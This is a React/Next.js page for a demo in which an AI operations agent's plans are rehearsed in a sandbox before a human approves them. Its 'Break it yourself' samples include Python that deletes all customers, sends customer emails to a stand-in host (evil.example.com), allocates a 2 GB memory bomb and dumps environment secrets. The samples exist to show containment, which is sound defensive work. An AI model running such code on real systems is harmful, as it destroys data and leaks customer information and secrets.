"use client";

import Link from "next/link";
import { useCallback, useEffect, useMemo, useRef, useState } from "react";
import { toast } from "sonner";
import { ArrowLeft, Ban, Bot, Check, CircleDashed, FlaskConical, Loader2, RotateCcw, ShieldAlert, ShieldCheck, Sparkles, User, Wrench, X } from "lucide-react";
import { Button } from "@/components/ui/button";
import { Textarea } from "@/components/ui/textarea";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { ApprovalCard, viewFromAttempt } from "@/components/approval-card";
import { Wordmark } from "@/components/brand";
import { api, num, usd, type Business, type Health, type Run } from "@/lib/api";
import { cn } from "@/lib/utils";

const EXAMPLES = [
  "Refund everyone who was double-charged last week and send them an apology email.",
  "Go through last week's support tickets and take care of what customers asked for.",
  "Email our VIP customers a thank-you note with the code BEANS10 for 10% off.",
];

const BREAK_IT: { label: string; task: string; code: string }[] = [
  { label: "Delete every customer", task: "Clean up the customer table", code: `def run(ctx):\n    ctx.db.execute("DELETE FROM customers")\n` },
  { label: "Steal data", task: "Back up customers to our server", code: `import urllib.request, json\n\ndef run(ctx):\n    rows = ctx.db.execute("SELECT email FROM customers").fetchall()\n    urllib.request.urlopen("https://evil.example.com/upload", data=json.dumps(rows).encode())\n` },
  { label: "Memory bomb", task: "Cache everything", code: `def run(ctx):\n    blob = bytearray(2 * 1024 * 1024 * 1024)\n` },
  { label: "Read secrets", task: "Debug the environment", code: `import os, glob\n\ndef run(ctx):\n    ctx.log("env:", dict(os.environ))\n    ctx.log("home:", glob.glob("/root/*") + glob.glob("/home/*"))\n    open("/etc/stunt", "w").write("x")\n` },
];

const ACTIVE = new Set(["queued", "planning", "rehearsing", "verifying", "applying"]);
const STATUS_LABEL: Record<string, string> = {
  queued: "Queued", planning: "Agent is planning", rehearsing: "Rehearsing in sandbox", verifying: "Verifying consequences", review: "Waiting for your approval",
  applying: "Applying for real", applied: "Applied", drifted: "Drift detected, nothing applied", rejected: "Rejected, nothing changed", failed: "Failed",
};

function EventIcon({ kind }: { kind: string }) {
  const c = "size-3.5";
  if (kind === "agent") return <Bot className={c} />;
  if (kind === "sandbox") return <FlaskConical className={c} />;
  if (kind === "verify") return <ShieldCheck className={c} />;
  if (kind === "human") return <User className={c} />;
  if (kind === "applied") return <Check className={c} />;
  if (kind === "drift" || kind === "error") return <ShieldAlert className={cn(c, "text-damage")} />;
  return <CircleDashed className={c} />;
}

export default function AppPage() {
  const [biz, setBiz] = useState<Business | null>(null);
  const [health, setHealth] = useState<Health | null>(null);
  const [task, setTask] = useState(EXAMPLES[0]);
  const [mode, setMode] = useState<"agent" | "break">("agent");
  const [code, setCode] = useState(BREAK_IT[0].code);
  const [breakTask, setBreakTask] = useState(BREAK_IT[0].task);
  const [run, setRun] = useState<Run | null>(null);
  const [busy, setBusy] = useState(false);
  const runId = run?.id;
  const timer = useRef<ReturnType<typeof setTimeout> | null>(null);

  const refreshBiz = useCallback(() => api.business().then(setBiz).catch(() => {}), []);
  useEffect(() => {
    refreshBiz();
    api.health().then(setHealth).catch(() => {});
  }, [refreshBiz]);

  useEffect(() => {
    if (!runId) return;
    let stop = false;
    const tick = async () => {
      try {
        const r = await api.run(runId);
        if (stop) return;
        setRun(r);
        if (ACTIVE.has(r.status)) timer.current = setTimeout(tick, 700);
        else refreshBiz();
      } catch {
        if (!stop) timer.current = setTimeout(tick, 1500);
      }
    };
    tick();
    return () => { stop = true; if (timer.current) clearTimeout(timer.current); };
  }, [runId, refreshBiz]);

  const attempt = run?.attempts.at(-1);
  const view = useMemo(() => (run && attempt ? viewFromAttempt(run.task, attempt, run.verdict, run.flags.length ? run.flags : attempt.flags) : null), [run, attempt]);
  const critical = !!attempt?.flags.some((f) => f.severity === "critical");
  const containment = useMemo(() => {
    if (!attempt) return null;
    const hit = Object.entries(attempt.consequences.tables).find(([, t]) => t.dropped || (t.rows_before > 0 && t.deleted / t.rows_before >= 0.05));
    return hit ? { table: hit[0], sandbox: hit[1].rows_after, before: hit[1].rows_before } : null;
  }, [attempt]);

  async function start() {
    setBusy(true);
    try {
      const { id } = mode === "agent" ? await api.createRun(task) : await api.createManualRun(breakTask, code);
      setRun({ id, task: mode === "agent" ? task : breakTask, mode: mode === "agent" ? "agent" : "manual", status: "queued", created_at: Date.now() / 1000,
        events: [], attempts: [], verdict: null, flags: [], final_message: null, error: null, agent_model: "", verifier_model: "", apply_result: null });
    } catch (e) {
      toast.error((e as Error).message);
    } finally {
      setBusy(false);
    }
  }

  async function act(kind: "approve" | "reject" | "fix") {
    if (!run) return;
    setBusy(true);
    try {
      if (kind === "fix") { await api.fix(run.id); setRun({ ...run, status: "planning" }); }
      else { const r = await api[kind](run.id); setRun(r); refreshBiz(); }
    } catch (e) {
      toast.error((e as Error).message);
    } finally {
      setBusy(false);
    }
  }

  async function reset() {
    setBusy(true);
    try { setBiz(await api.reset()); setRun(null); toast.success("Demo business restored to its original state"); }
    catch (e) { toast.error((e as Error).message); }
    finally { setBusy(false); }
  }

  const running = run ? ACTIVE.has(run.status) : false;

  return (
    <div className="min-h-dvh">
      <header className="border-b bg-background/80 backdrop-blur">
        <div className="mx-auto flex h-14 max-w-7xl items-center justify-between gap-3 px-4 sm:px-6">
          <div className="flex items-center gap-4">
            <Link href="/" className="text-muted-foreground hover:text-foreground" aria-label="Back to site"><ArrowLeft className="size-4" /></Link>
            <Wordmark />
          </div>
          <div className="flex items-center gap-2">
            <span className="hidden items-center gap-1.5 rounded-full border px-3 py-1 font-mono text-[11px] text-muted-foreground sm:inline-flex">
              <span className={cn("size-1.5 rounded-full", health?.inference_configured ? "bg-foreground" : "bg-damage")} />
              {health ? `${health.agent_model} · sandbox ${health.sandbox_runtime === "runsc" ? "gVisor" : health.sandbox_runtime}` : "connecting…"}
            </span>
            <Button variant="outline" className="h-8 rounded-full px-3" onClick={reset} disabled={busy || running}><RotateCcw className="size-3.5" /> Reset demo</Button>
          </div>
        </div>
      </header>

      <div className="mx-auto grid max-w-7xl gap-6 px-4 py-6 sm:px-6 lg:grid-cols-[minmax(0,5fr)_minmax(0,7fr)]">
        {/* LEFT: business + composer + timeline */}
        <div className="min-w-0 space-y-5">
          <div className="rounded-2xl border bg-card p-5">
            <div className="flex items-baseline justify-between gap-3">
              <div className="font-display text-2xl">Bean There Coffee Co.</div>
              <span className="font-mono text-[11px] uppercase tracking-wider text-muted-foreground">production</span>
            </div>
            <div className="mt-4 grid grid-cols-4 gap-2 font-mono text-sm">
              {(["customers", "orders", "charges", "tickets"] as const).map((k) => (
                <div key={k} className="min-w-0">
                  <div className={cn("truncate text-lg tabular", containment && containment.table === k && "text-foreground")}>{biz ? num(biz.counts[k]) : "—"}</div>
                  <div className="text-[11px] text-muted-foreground">{k}</div>
                </div>
              ))}
            </div>
            <div className="mt-3 flex flex-wrap gap-x-4 gap-y-1 border-t pt-3 font-mono text-[11px] text-muted-foreground">
              <span>BeanPay refunds: {biz ? `${num(biz.beanpay.count)} · ${usd(biz.beanpay.total_cents)}` : "—"}</span>
            </div>
          </div>

          <div className="rounded-2xl border bg-card p-5">
            <Tabs value={mode} onValueChange={(v) => setMode(v as "agent" | "break")}>
              <TabsList className="w-full">
                <TabsTrigger value="agent" className="flex-1"><Sparkles className="size-3.5" /> Ask the agent</TabsTrigger>
                <TabsTrigger value="break" className="flex-1"><Ban className="size-3.5" /> Break it yourself</TabsTrigger>
              </TabsList>
              <TabsContent value="agent" className="space-y-3 pt-3">
                <Textarea value={task} onChange={(e) => setTask(e.target.value)} rows={3} className="resize-none text-[15px]" placeholder="What should the ops agent do?" />
                <div className="flex flex-wrap gap-1.5">
                  {EXAMPLES.map((ex) => (
                    <button key={ex} onClick={() => setTask(ex)} className={cn("max-w-full truncate rounded-full border px-2.5 py-1 text-xs text-muted-foreground hover:text-foreground", task === ex && "border-foreground text-foreground")}>{ex}</button>
                  ))}
                </div>
              </TabsContent>
              <TabsContent value="break" className="space-y-3 pt-3">
                <p className="text-sm text-muted-foreground">Paste any plan, even a malicious one. It only ever runs on the double.</p>
                <div className="flex flex-wrap gap-1.5">
                  {BREAK_IT.map((b) => (
                    <button key={b.label} onClick={() => { setCode(b.code); setBreakTask(b.task); }} className={cn("rounded-full border px-2.5 py-1 text-xs text-muted-foreground hover:text-foreground", code === b.code && "border-foreground text-foreground")}>{b.label}</button>
                  ))}
                </div>
                <Textarea value={code} onChange={(e) => setCode(e.target.value)} rows={7} spellCheck={false} className="resize-none font-mono text-[12.5px]" />
              </TabsContent>
            </Tabs>
            <Button className="mt-4 h-11 w-full rounded-full text-[15px]" onClick={start} disabled={busy || running || (mode === "agent" ? task.trim().length < 3 : code.trim().length < 10)}>
              {running ? <><Loader2 className="size-4 animate-spin" /> {STATUS_LABEL[run!.status]}</> : <><FlaskConical className="size-4" /> Rehearse it</>}
            </Button>
          </div>

          {run ? (
            <div className="rounded-2xl border bg-card p-5">
              <div className="flex items-center justify-between gap-3">
                <div className="text-sm font-medium">Timeline</div>
                <span className={cn("rounded-full border px-2 py-0.5 font-mono text-[11px]", ["drifted", "failed"].includes(run.status) && "border-damage/40 text-damage")}>{STATUS_LABEL[run.status]}</span>
              </div>
              <ol className="mt-4 space-y-3">
                {run.events.map((e, i) => (
                  <li key={i} className="animate-rise flex gap-3 text-sm">
                    <span className="mt-0.5 flex size-6 shrink-0 items-center justify-center rounded-full border bg-background"><EventIcon kind={e.kind} /></span>
                    <div className="min-w-0">
                      <div>{e.title}</div>
                      {e.detail ? <div className="mt-0.5 truncate font-mono text-[11px] text-muted-foreground" title={e.detail}>{e.detail}</div> : null}
                    </div>
                  </li>
                ))}
                {running ? <li className="flex items-center gap-3 text-sm text-muted-foreground"><Loader2 className="size-4 animate-spin" /> {STATUS_LABEL[run.status]}…</li> : null}
              </ol>
              {run.error ? <div className="mt-4 rounded-lg border border-damage/30 bg-damage/[0.04] p-3 text-sm text-damage">{run.error}</div> : null}
            </div>
          ) : null}
        </div>

        {/* RIGHT: consequences */}
        <div className="min-w-0 space-y-5">
          {!run ? (
            <div className="flex min-h-[420px] flex-col items-center justify-center rounded-2xl border border-dashed bg-card/50 p-10 text-center">
              <FlaskConical className="size-8 text-muted-foreground" />
              <div className="mt-4 font-display text-3xl">Nothing rehearsed yet</div>
              <p className="mt-2 max-w-sm text-sm text-muted-foreground">Ask the ops agent to do something. Its plan runs on a throwaway copy of the business first, and you&apos;ll see the consequences here.</p>
            </div>
          ) : !view ? (
            <div className="flex min-h-[420px] flex-col items-center justify-center gap-3 rounded-2xl border bg-card p-10 text-center">
              <Loader2 className="size-6 animate-spin text-muted-foreground" />
              <div className="text-sm text-muted-foreground">{STATUS_LABEL[run.status]}…</div>
            </div>
          ) : (
            <>
              {containment ? (
                <div className="animate-rise grid grid-cols-2 gap-3 rounded-2xl border border-damage/30 bg-card p-4 text-center sm:p-5">
                  <div className="col-span-2 flex items-center justify-center gap-2 font-mono text-[11px] uppercase tracking-wider text-damage"><ShieldAlert className="size-3.5" /> containment: the damage happened only on the double</div>
                  <div className="rounded-xl border border-damage/30 bg-damage/[0.04] p-4">
                    <div className="font-mono text-[11px] uppercase tracking-wider text-damage">sandbox {containment.table}</div>
                    <div className="mt-1 font-mono text-4xl text-damage tabular sm:text-5xl">{num(containment.sandbox)}</div>
                    <div className="text-xs text-muted-foreground">was {num(containment.before)}</div>
                  </div>
                  <div className="rounded-xl border p-4">
                    <div className="font-mono text-[11px] uppercase tracking-wider text-muted-foreground">production {containment.table}</div>
                    <div className="mt-1 font-mono text-4xl tabular sm:text-5xl">{biz ? num((biz.counts as Record<string, number>)[containment.table] ?? containment.before) : num(containment.before)}</div>
                    <div className="text-xs text-muted-foreground">untouched</div>
                  </div>
                </div>
              ) : null}

              <ApprovalCard view={view} label={run.status === "applied" ? "Applied" : run.status === "rejected" ? "Rejected" : run.status === "drifted" ? "Drift detected" : "Approval required"}>
                {run.status === "review" ? (
                  <>
                    <Button variant="outline" className="h-10 rounded-full px-4" onClick={() => act("reject")} disabled={busy}><X className="size-4" /> Reject</Button>
                    {run.mode === "agent" ? <Button variant="outline" className="h-10 rounded-full px-4" onClick={() => act("fix")} disabled={busy}><Wrench className="size-4" /> Ask the agent to fix it</Button> : null}
                    <Button className="h-10 rounded-full px-4 sm:ml-auto" onClick={() => act("approve")} disabled={busy || critical || !attempt?.consequences.ok}>
                      <Check className="size-4" /> {critical ? "Blocked by policy" : "Approve and apply"}
                    </Button>
                  </>
                ) : null}
                {run.status === "drifted" ? <Button className="h-10 rounded-full px-4" onClick={start} disabled={busy}><RotateCcw className="size-4" /> Rehearse again</Button> : null}
              </ApprovalCard>

              {run.status === "applied" && run.apply_result ? (
                <div className="animate-rise rounded-2xl border bg-card p-5">
                  <div className="flex items-center gap-2 font-medium"><Check className="size-4" /> Applied for real</div>
                  <div className="mt-3 grid gap-2 font-mono text-[13px] sm:grid-cols-2">
                    {[["drift check", "passed"], ["database rows", num(run.apply_result.rows_written ?? 0)], ["BeanPay refunds", `${num(run.apply_result.refunds ?? 0)} · ${usd(run.apply_result.refund_total_cents ?? 0)}`], ["emails delivered", num(run.apply_result.emails_sent ?? 0)]].map(([k, v]) => (
                      <div key={k} className="flex justify-between gap-3 rounded-lg border bg-background px-3 py-2"><span className="text-muted-foreground">{k}</span><span>{v}</span></div>
                    ))}
                  </div>
                </div>
              ) : null}

              {attempt ? <Details attempt={attempt} /> : null}
            </>
          )}
        </div>
      </div>
    </div>
  );
}

function Details({ attempt }: { attempt: NonNullable<Run["attempts"][number]> }) {
  const c = attempt.consequences;
  const updated = Object.entries(c.tables).flatMap(([t, d]) => [
    ...d.samples.updated.map((r) => ({ t, op: "update", row: r.after, changed: r.changed, before: r.before })),
    ...d.samples.deleted.map((r) => ({ t, op: "delete", row: r.before, changed: [] as string[], before: r.before })),
    ...d.samples.inserted.map((r) => ({ t, op: "insert", row: r.after, changed: [] as string[], before: undefined })),
  ]);
  return (
    <div className="rounded-2xl border bg-card p-5">
      <Tabs defaultValue="rows">
        <TabsList className="flex w-full flex-wrap">
          <TabsTrigger value="rows">Rows</TabsTrigger>
          <TabsTrigger value="emails">Emails · {num(c.emails.count)}</TabsTrigger>
          <TabsTrigger value="refunds">Refunds · {num(c.payments.count)}</TabsTrigger>
          <TabsTrigger value="sandbox">Sandbox</TabsTrigger>
          <TabsTrigger value="code">Code</TabsTrigger>
        </TabsList>
        <TabsContent value="rows" className="pt-3">
          {updated.length ? (
            <div className="space-y-2">
              {updated.slice(0, 12).map((u, i) => (
                <div key={i} className="overflow-x-auto rounded-lg border bg-background px-3 py-2 font-mono text-[12px]">
                  <span className={cn("mr-2 rounded px-1.5 py-0.5 text-[10px] uppercase", u.op === "delete" ? "bg-damage/10 text-damage" : "bg-muted")}>{u.op} {u.t}</span>
                  {Object.entries(u.row).map(([k, v]) => (
                    <span key={k} className={cn("mr-3 whitespace-nowrap", u.changed.includes(k) ? "text-foreground" : "text-muted-foreground")}>
                      {k}={u.changed.includes(k) && u.before ? <><s className="opacity-50">{String(u.before[k])}</s>→</> : null}{String(v)}
                    </span>
                  ))}
                </div>
              ))}
              <p className="text-xs text-muted-foreground">Showing a sample. Every changed row is recorded and replayed exactly on approval.</p>
            </div>
          ) : <p className="text-sm text-muted-foreground">No rows changed.</p>}
        </TabsContent>
        <TabsContent value="emails" className="space-y-2 pt-3">
          {c.emails.samples.length ? c.emails.samples.slice(0, 6).map((e, i) => (
            <div key={i} className="rounded-lg border bg-background p-3 text-sm">
              <div className="font-mono text-[11px] text-muted-foreground">to {e.to}</div>
              <div className="mt-1 font-medium">{e.subject}</div>
              <p className={cn("mt-1 whitespace-pre-line text-muted-foreground", /\{\{|\{[a-z_]+\}/.test(e.body) && "text-damage")}>{e.body}</p>
            </div>
          )) : <p className="text-sm text-muted-foreground">No emails would be sent.</p>}
        </TabsContent>
        <TabsContent value="refunds" className="pt-3">
          {c.payments.samples.length ? (
            <div className="space-y-1.5 font-mono text-[12px]">
              {c.payments.samples.slice(0, 12).map((p, i) => (
                <div key={i} className="flex justify-between gap-3 rounded-lg border bg-background px-3 py-2"><span>charge #{p.charge_id}</span><span className="text-muted-foreground">{p.reason}</span><span>{usd(p.amount_cents)}</span></div>
              ))}
              <div className="flex justify-between px-3 pt-1 text-foreground"><span>total</span><span>{usd(c.payments.total_cents)}</span></div>
            </div>
          ) : <p className="text-sm text-muted-foreground">No money would move.</p>}
        </TabsContent>
        <TabsContent value="sandbox" className="pt-3">
          <div className="grid gap-1.5 font-mono text-[12px] sm:grid-cols-2">
            {[["id", c.sandbox.id], ["runtime", c.sandbox.runtime === "runsc" ? "gVisor (runsc)" : c.sandbox.runtime], ["network", c.sandbox.network], ["memory cap", c.sandbox.memory],
              ["read-only root", String(c.sandbox.read_only_root)], ["env vars seen", (c.guards.env_keys ?? []).join(", ") || "none"], ["wall time", `${c.sandbox.wall_ms} ms`], ["destroyed", String(c.sandbox.destroyed)]].map(([k, v]) => (
              <div key={k} className="flex justify-between gap-3 rounded-lg border bg-background px-3 py-2"><span className="text-muted-foreground">{k}</span><span className="truncate">{v}</span></div>
            ))}
          </div>
          {c.blocked.length ? (
            <div className="mt-3 space-y-1.5">
              {c.blocked.map((b, i) => <div key={i} className="flex items-center gap-2 rounded-lg border border-damage/30 bg-damage/[0.04] px-3 py-2 font-mono text-[12px] text-damage"><Ban className="size-3.5" /> blocked {b.kind}: {b.target}</div>)}
            </div>
          ) : null}
          {c.error ? <pre className="mt-3 overflow-x-auto rounded-lg border bg-background p-3 font-mono text-[11px] text-damage">{c.error.message}</pre> : null}
          {c.logs?.length ? <pre className="mt-3 overflow-x-auto rounded-lg border bg-background p-3 font-mono text-[11px] text-muted-foreground">{c.logs.join("\n")}</pre> : null}
        </TabsContent>
        <TabsContent value="code" className="pt-3">
          <pre className="max-h-[420px] overflow-auto rounded-lg border bg-background p-3 font-mono text-[12px] leading-relaxed">{attempt.code}</pre>
        </TabsContent>
      </Tabs>
    </div>
  );
}
